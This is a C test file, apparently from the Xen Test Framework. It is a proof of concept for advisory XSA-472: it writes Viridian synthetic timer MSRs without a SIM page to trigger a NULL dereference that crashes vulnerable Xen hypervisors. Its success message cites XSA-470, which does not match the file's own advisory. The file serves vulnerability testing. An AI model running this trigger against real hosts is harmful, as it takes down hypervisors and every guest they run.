/**
 * @file tests/xsa-472-2/main.c
 * @ref test-xsa-472-2
 *
 * @page test-xsa-472-2 XSA-472 SIM page dereference
 *
 * Advisory: [XSA-472](https://xenbits.xen.org/xsa/advisory-472.html)
 *
 * Viridian Synthetic Timers assume the SIM page to be unconditionally mapped,
 * so attempting to use stimers without SIM page setup triggers a NULL
 * dereference in Xen.
 *
 * @see tests/xsa-472-2/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-472-2 PoC";

#define HV_X64_MSR_STIMER0_CONFIG 0x400000B0
#define HV_X64_MSR_STIMER0_COUNT 0x400000B1

void test_main(void)
{
    int rc = apic_init(APIC_MODE_XAPIC);

    if ( rc )
        return xtf_error("Error: unable to init APIC: %d\n", rc);

    /*
     * Test if using Synthetic Timers assumes the SIM page to be
     * unconditionally mapped.
     */
    wrmsr(HV_X64_MSR_STIMER0_COUNT, 1);
    wrmsr(HV_X64_MSR_STIMER0_CONFIG, (1 << 16) | 1);

    /*
     * If we're still alive here, Xen didn't crash, so the NULL pointer
     * dereference is not present.
     */
    xtf_success("Success: Not vulnerable to XSA-470 (CVE-2025-58142)\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
